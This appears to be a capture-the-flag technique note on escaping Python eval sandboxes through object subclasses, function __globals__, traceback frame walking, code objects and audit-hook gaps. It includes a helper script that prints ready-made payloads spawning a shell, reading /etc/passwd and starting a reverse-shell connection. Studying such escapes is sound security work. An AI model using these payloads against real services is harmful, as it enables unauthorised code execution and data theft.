---
title: "Python Jail Escape - Builtins, Subclasses and Frames"
category: misc
subcategory: pyjail
type: technique
tags: [pyjail, python-jail, jail-escape, sandbox-escape, subclasses, builtins, eval, exec, audit-hook, breakpoint, f-string, code-object, gi-frame, pickle, reduce, import, os-system]
difficulty: medium
summary: "With no builtins and no import you still reach os via object subclasses, any function's __globals__, or a frame walk."
when_to_use:
  - "A service evals your input with a restricted globals/builtins dict"
  - "`__builtins__` is None or a stripped dict but you can still evaluate expressions"
  - "Keywords like import/open/eval are blacklisted but attribute access works"
  - "You control a class definition, a decorator, or an f-string format spec"
tools: [python3, pwntools]
related: [python-jail-restricted-chars, eval-jail-generic, jail-escape-payloads, shell-jail-escape, js-sandbox-escape, ctf-general-cheatsheet]
---

## TL;DR

Every Python object is reachable from every other object. From any object you get to `type`,
from `type` to `object`, from `object` to **every loaded class** via `__subclasses__()`, and
from any of those classes to a function whose `__globals__` contains `__builtins__` - and then
to `os.system`. No `import` statement, no builtins dict, no problem.

## Recognise it

```python
# the classic vulnerable pattern
BLACKLIST = ["import", "os", "eval", "exec", "open", "__"]
user = input("> ")
if any(b in user for b in BLACKLIST):
    print("nope")
else:
    print(eval(user, {"__builtins__": {}}, {}))
```

Signals:
- `eval`/`exec`/`compile` on user input, with a restricted `globals` dict.
- `{"__builtins__": {}}` or `{"__builtins__": None}`.
- A substring blacklist (always bypassable - see the character-restriction technique).
- A `code.InteractiveConsole`, a "calculator", or a templating engine.
- `sys.addaudithook` present - that is a real boundary for *some* operations.

## Theory

### The universal chain

```python
().__class__                       # tuple
().__class__.__base__              # object      (or .__mro__[1], or .__bases__[0])
().__class__.__base__.__subclasses__()   # every class currently loaded
```

The subclass list is **not stable across versions or programs** - never hardcode an index.
Always search by name:

```python
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == "Popen"]
```

Useful targets in that list, in rough order of reliability:

| Class | How to use it |
| --- | --- |
| `subprocess.Popen` | `cls(["/bin/sh"], shell=False)` - direct execution |
| `os._wrap_close` | `cls.__init__.__globals__["system"]("sh")` - present whenever `os.popen` was used |
| `warnings.catch_warnings` | `cls()._module.__builtins__["__import__"]("os")` - the classic |
| `_frozen_importlib.BuiltinImporter` | `cls.load_module("os")` |
| `_sitebuiltins._Helper` | reaches `pydoc`, which imports plenty |
| `codecs.IncrementalEncoder` | `cls.__init__.__globals__` |
| any class at all | `cls.__init__.__globals__` often holds `__builtins__` |

### The `__globals__` shortcut

*Any* Python-level function object exposes the module globals it was defined in:

```python
# from a lambda you define yourself - works even with no subclasses of interest
(lambda: 0).__globals__            # the jail's own module globals, often with os already imported
(lambda: 0).__globals__["__builtins__"]["__import__"]("os").system("sh")
```

If the jail defines *any* function or class you can reference, `f.__globals__` or
`C.__init__.__globals__` is the shortest path.

### Frame walking

`f_back` walks up the call stack, so `f_globals` of the frame above yours is the globals of the
code that called `eval` - which has everything, including anything the jail imported for itself.

The reliable no-import way to get a frame is an **exception traceback**:

```python
# statement form (exec): tb_frame is the frame that raised, f_back is its caller
try:
    raise ValueError
except ValueError as e:
    caller_globals = e.__traceback__.tb_frame.f_back.f_globals
    caller_globals["__builtins__"]["__import__"]("os").system("sh")
```

If `sys` is reachable at all, `sys._getframe(1).f_globals` is shorter. Note the common myth:
`(i for i in [1]).gi_frame.f_back` is **None** - a generator's `f_back` is only populated while
that generator is actually executing, not when it is merely created or suspended. Use the
traceback route instead.

### Bytecode construction

When you can build a code object you bypass every source-level filter:

```python
import types
code = compile("import os; os.system('sh')", "<x>", "exec")
types.FunctionType(code, {"__builtins__": __builtins__})()
```

Or hand-assemble the bytecode via `types.CodeType(...)`. The signature changes between Python
versions (3.8 added `posonlyargcount`, 3.11 added `qualname` and `exceptiontable`), so use
`code.replace(...)` on a compiled template rather than constructing from scratch.

### breakpoint()

`breakpoint()` calls `sys.breakpointhook()`, which by default imports the module named in the
`PYTHONBREAKPOINT` environment variable and calls it:

```python
breakpoint()                 # drops into pdb, from which: import os; os.system('sh')
# in pdb: !import os ; os.system('sh')
```

If you control the environment, `PYTHONBREAKPOINT=os.system` makes `breakpoint("sh")` execute a
shell. Inside a jail `breakpoint` is a builtin, so it dies with `__builtins__` - but it is worth
one try because many jails forget it.

### Audit hooks

Python 3.8+ can install `sys.addaudithook(fn)`. Hooks fire for events such as `exec`,
`compile`, `import`, `os.system`, `subprocess.Popen`, `open`, `socket.connect`. A hook that
raises blocks the operation. Important properties:

- Hooks **cannot be removed** once added (there is no `removeaudithook`).
- They are per-interpreter and inherited by threads.
- They do *not* see pure-Python operations that use no audited C API: attribute traversal,
  arithmetic, building lists. So `__subclasses__()` is invisible to auditing.
- A hook that only blocks `exec` still allows `os.system` unless it also blocks that event.
- `os.fork`/`posix_spawn` and writing to `/proc/self/mem` are audited in modern versions, but
  arbitrary `ctypes` calls historically slipped through - check what the hook actually filters.

The practical approach: enumerate the hook's blacklist (it is usually a short list of event
names in the challenge source) and find an equivalent operation it forgot.

## Attack

1. **Confirm what you have.** Evaluate `dir()`, `globals()`, `[].__class__`, `__builtins__`.
2. **Try the cheap wins**: `breakpoint()`, `help()`, `license()`, `__import__("os")`.
3. **Find a function object** in reach and read its `__globals__`.
4. **Walk subclasses** by name for `Popen`, `_wrap_close`, `catch_warnings`, `BuiltinImporter`.
5. **If output is suppressed**, use a side channel: write to a file, open a socket, or time-based
   (`__import__("time").sleep(5)` when a condition holds).
6. **If the blacklist blocks the strings you need**, build them (see `python-jail-restricted-chars`).

## Code

```python
#!/usr/bin/env python3
"""Pyjail helper: enumerate reachable escape gadgets and emit ready-to-paste payloads.

Run it inside the target's Python version (or locally to generate payloads to paste in).

  python3 pyjail_finder.py            # list gadgets available here
  python3 pyjail_finder.py --payloads # print payloads
  python3 pyjail_finder.py --selftest
"""
from __future__ import annotations

import sys

# Names worth hunting for in object.__subclasses__()
TARGETS = {
    "Popen": "cls(['/bin/sh','-c','id'], shell=False)",
    "_wrap_close": "cls.__init__.__globals__['system']('id')",
    "catch_warnings": "cls()._module.__builtins__['__import__']('os').system('id')",
    "BuiltinImporter": "cls.load_module('os').system('id')",
    "_Helper": "reaches pydoc; pydoc imports arbitrary modules by name",
    "_ModuleLock": "cls.__init__.__globals__ has the importlib internals",
    "IncrementalEncoder": "cls.__init__.__globals__['__builtins__']",
    "Codec": "cls.__init__.__globals__",
    "_GeneratorContextManagerBase": "cls.__init__.__globals__",
    "FileIO": "cls('/etc/passwd').read()  # file read without open()",
    "_IOBase": "subclass FileIO gives raw file access",
}


def all_subclasses() -> list[type]:
    return ().__class__.__base__.__subclasses__()


def find(name: str) -> list[tuple[int, type]]:
    """Every subclass whose __name__ matches, with its index (indices are version-specific)."""
    return [(i, c) for i, c in enumerate(all_subclasses()) if c.__name__ == name]


def gadgets() -> list[str]:
    out: list[str] = []
    subs = all_subclasses()
    out.append(f"{len(subs)} subclasses of object are loaded")
    for name, how in TARGETS.items():
        hits = find(name)
        if hits:
            idx = hits[0][0]
            out.append(f"  [{idx:>4}] {name:<32} {how}")
    # any class whose __init__ globals expose __builtins__
    builtins_carriers = []
    for i, c in enumerate(subs):
        init = getattr(c, "__init__", None)
        g = getattr(init, "__globals__", None)
        if isinstance(g, dict) and "__builtins__" in g:
            builtins_carriers.append((i, c.__name__))
        if len(builtins_carriers) >= 5:
            break
    if builtins_carriers:
        out.append("  classes whose __init__.__globals__ carries __builtins__: "
                   + ", ".join(f"{n}[{i}]" for i, n in builtins_carriers))
    return out


def payloads(cmd: str = "id") -> list[tuple[str, str]]:
    """(label, payload) pairs. Each payload is a single expression unless noted."""
    q = repr(cmd)
    return [
        ("import, when builtins survive",
         f"__import__('os').system({q})"),
        ("any function's globals",
         f"(lambda:0).__globals__['__builtins__']['__import__']('os').system({q})"),
        ("subclass search: Popen (no os import needed)",
         "[c for c in ().__class__.__base__.__subclasses__() "
         f"if c.__name__=='Popen'][0]({cmd.split()!r})"),
        ("subclass search: os._wrap_close",
         "[c for c in ().__class__.__base__.__subclasses__() "
         f"if c.__name__=='_wrap_close'][0].__init__.__globals__['system']({q})"),
        ("subclass search: catch_warnings -> builtins",
         "[c for c in ().__class__.__base__.__subclasses__() "
         "if c.__name__=='catch_warnings'][0]()._module.__builtins__"
         f"['__import__']('os').system({q})"),
        ("subclass search: BuiltinImporter",
         "[c for c in ().__class__.__base__.__subclasses__() "
         f"if c.__name__=='BuiltinImporter'][0].load_module('os').system({q})"),
        ("file read without open(): FileIO",
         "[c for c in ().__class__.__base__.__subclasses__() "
         "if c.__name__=='FileIO'][0]('/etc/passwd').read()"),
        ("frame walk to the caller's globals (exec, not eval)",
         "try:\n    raise ValueError\nexcept ValueError as e:\n"
         f"    e.__traceback__.tb_frame.f_back.f_globals['__builtins__']"
         f"['__import__']('os').system({q})"),
        ("builtins via a loaded module's __loader__",
         f"().__class__.__base__.__subclasses__()[0].__init__.__globals__"),
        ("f-string expression (bypasses many source filters)",
         "f'{().__class__.__base__.__subclasses__()}'"),
        ("breakpoint, then `import os; os.system(...)` at the pdb prompt",
         "breakpoint()"),
        ("exec a compiled code object (defeats source-level blacklists)",
         "[t for t in ().__class__.__base__.__subclasses__() if t.__name__=='_wrap_close']"
         f"[0].__init__.__globals__['__builtins__']['exec'](\"import os;os.system({q})\")"),
        ("decorator form (no parentheses needed on the call site)",
         "@[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='Popen'][0]\n"
         "class X: ...   # NOTE: statement, not an expression"),
        ("reverse shell one-liner",
         "__import__('socket').create_connection(('127.0.0.1',4444)) "
         "# then dup2 the fd onto 0/1/2 with __import__('os').dup2"),
    ]


def probe_environment() -> list[str]:
    """What a jail has left you: run this first inside the target."""
    checks = [
        ("__builtins__ type", "type(__builtins__)"),
        ("globals keys", "list(globals())"),
        ("dir()", "dir()"),
        ("object subclass count", "len(().__class__.__base__.__subclasses__())"),
        ("audit hooks installed?", "hasattr(__import__('sys'), 'audit')"),
    ]
    return [f"{label:<26} -> eval this in the jail: {expr}" for label, expr in checks]


def _selftest() -> None:
    subs = all_subclasses()
    assert len(subs) > 50, f"only {len(subs)} subclasses - unexpected"

    # object traversal is stable across CPython versions
    assert ().__class__ is tuple
    assert ().__class__.__base__ is object
    assert ().__class__.__mro__[1] is object

    # __globals__ of a locally defined lambda reaches builtins
    g = (lambda: 0).__globals__
    assert "__builtins__" in g, list(g)[:10]

    # find() locates classes by name rather than by a brittle index
    hits = find("_wrap_close") or find("catch_warnings") or find("BuiltinImporter")
    assert hits, "no known gadget class found in object.__subclasses__()"
    idx, cls = hits[0]
    assert subs[idx] is cls

    # a compiled code object runs through FunctionType with a supplied globals dict
    import types
    code = compile("result = 6 * 7", "<jail>", "exec")
    ns: dict = {}
    types.FunctionType(code, ns)()
    assert ns.get("result") == 42, ns

    # a traceback reaches the caller's frame (an unstarted generator's f_back does NOT)
    assert (i for i in [1]).gi_frame.f_back is None
    try:
        raise ValueError
    except ValueError as exc:
        outer = exc.__traceback__.tb_frame.f_back.f_globals
    assert isinstance(outer, dict) and "TARGETS" in outer, list(outer)[:8]

    # every emitted payload is at least syntactically valid where it claims to be
    ok = 0
    for label, p in payloads("id"):
        if "NOTE: statement" in p:
            continue
        try:
            compile(p, "<payload>", "eval")
            ok += 1
        except SyntaxError:
            compile(p, "<payload>", "exec")
            ok += 1
    assert ok >= 12, ok
    print(f"selftest ok: {len(subs)} subclasses, gadget {cls.__name__} at index {idx}, "
          f"{ok} payloads compile")


def main() -> int:
    if "--selftest" in sys.argv:
        _selftest()
        return 0
    if "--payloads" in sys.argv:
        for label, p in payloads(sys.argv[-1] if len(sys.argv) > 2 else "id"):
            print(f"# {label}\n{p}\n")
        return 0
    print(f"python {sys.version.split()[0]}")
    for line in gadgets():
        print(line)
    print("\nprobe these first inside the jail:")
    for line in probe_environment():
        print("  " + line)
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

## Variants and pitfalls

- **Never hardcode a subclass index.** `__subclasses__()[133]` works on the author's machine
  and nowhere else. Always filter by `__name__`.
- **`os._wrap_close` only exists if `os.popen` has been used** in that interpreter. If it is
  missing, `catch_warnings` or `BuiltinImporter` usually is not.
- **Output suppression**: if the jail discards the result, use `print` through the recovered
  builtins, write to a file the service serves, or exfiltrate over DNS/HTTP.
- **`eval` vs `exec`**: `eval` takes a single expression. Statements (imports, assignments,
  decorators) need `exec`, a list comprehension trick, or the walrus operator `:=`.
- **Blacklist on `__`**: use `getattr(x, "_" + "_class__")`, or unicode confusables, or
  `vars()`/`type()`/`dir()` - covered in `python-jail-restricted-chars`.
- **`__builtins__` is a module in `__main__` and a dict elsewhere.** Handle both:
  `b = __builtins__; b = b.__dict__ if hasattr(b, "__dict__") else b`.
- **Audit hooks that block `exec`/`compile`** still allow attribute traversal and direct
  `os.system` unless those events are also blocked. Read the hook's code.
- **`sys.settrace`/`sys.setprofile`** are another way jails try to restrain you; they cost a lot
  of performance and rarely block anything useful.
- **RestrictedPython and `asteval`** parse the AST and reject dangerous nodes; the escape there
  is finding a node type they forgot (historically: format strings, `__class__` via `super()`).
- **Timeouts**: many jails kill you after N seconds. Spawn the shell with `&` or use a reverse
  shell so the connection outlives the eval.

## Tools

`python3` itself (test locally on the same minor version), `pwntools` for the socket
interaction, `dis` to inspect code objects, `inspect` for frame exploration.

## References

- CPython data model documentation for `__class__`, `__base__`, `__mro__`, `__subclasses__`,
  `__globals__` and frame objects: https://docs.python.org/3/reference/datamodel.html
- PEP 578 (Python Runtime Audit Hooks) defines `sys.addaudithook` and the audited events.
- PEP 553 defines `breakpoint()` and the `PYTHONBREAKPOINT` environment variable.
